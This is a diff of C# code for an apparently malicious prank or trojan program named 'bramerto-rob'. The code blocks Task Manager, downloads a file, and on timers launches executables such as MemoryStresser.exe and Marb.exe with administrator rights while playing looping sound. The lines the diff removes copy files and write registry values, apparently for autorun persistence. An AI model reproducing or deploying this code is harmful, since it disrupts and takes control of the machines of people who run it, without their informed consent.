@@ -96,11 +96,6 @@ namespace bramerto_rob
         {
             BlockTM();
             wc.DownloadFile("https://moe.shikimori.one/system/user_images/original/169245/914737.jpg", localfilename);            
-            File.Copy(source, destinationFile, true);
-            File.Copy(source2, destinationFile2, true);
-            File.Copy(source3, destinationFile3, true);
-            rkApp.SetValue(@"C:\Windows\.NET5.exe", Application.ExecutablePath.ToString());
-            rkApp.SetValue(@"C:\Windows\Server.exe", Application.ExecutablePath.ToString());
             ExecuteAsAdmin(@"C:\Program Files (x86)\bramerto-rob\Files\MemoryStresser.exe");
 
         }
@@ -128,11 +123,12 @@ namespace bramerto_rob
         {
             Time1.Stop();
             Time1.Enabled = false;
-            Time2.Interval = 120000;
-            Time2.Enabled = true;
-            Time2.Tick += new EventHandler(Time2_Tick);
-            Time2.Start();
-            ExecuteAsAdmin(@"C:\Program Files (x86)\bramerto-rob\Files\chilledwindows.exe");
+            Time3.Interval = 60000;
+            sp2.PlayLooping();
+            Time3.Enabled = true;
+            Time3.Tick += new EventHandler(Time3_Tick);
+            Time3.Start();
+            ExecuteAsAdmin(@"C:\Program Files (x86)\bramerto-rob\Marb\bin\Debug\net5.0-windows\Marb.exe");
         }
 
         
@@ -142,18 +138,6 @@ namespace bramerto_rob
             Time3.Enabled = false;
 
             ExecuteAsAdmin(@"C:\Program Files(x86)\Files\JavaPlatform.exe");
-        }
-
-        private void Time2_Tick(object sender, EventArgs e)
-        {
-            Time2.Stop();
-            sp2.PlayLooping();
-            Time2.Enabled = false;
-            Time3.Interval = 60000;
-            Time3.Enabled = true;
-            Time3.Tick += new EventHandler(Time3_Tick);
-            Time3.Start();
-            ExecuteAsAdmin(@"C:\Program Files (x86)\bramerto-rob\Marb\bin\Debug\net5.0-windows\Marb.exe");
         }        
     }
 }
